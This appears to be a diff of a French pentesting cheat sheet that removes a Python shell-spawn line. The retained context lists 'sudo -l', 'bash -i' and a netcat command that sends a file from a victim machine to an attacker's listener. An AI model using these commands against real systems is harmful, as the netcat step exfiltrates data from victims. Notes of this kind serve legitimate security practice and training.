@@ -45,7 +45,6 @@ Windows Local PrivEsc : https://book.hacktricks.xyz/windows-hardening/windows-lo
 # Basiques !
 ```
 [+] => INFO GATHERING           - sudo -l
-[+] => SPAWN SHELL USING PYTHON - python3 -c 'import pty; pty.spawn("/bin/sh")'
 [+] => SPAWN SHELL USING BASH   - bash -i
 [+] => TRANSFER FILE VIA NETCAT - [victime] nc -nv <ip> 1337 < <file_to_transfer> | [attacker] nc -lnvp 1337 > <file_to_transfer>
 ```
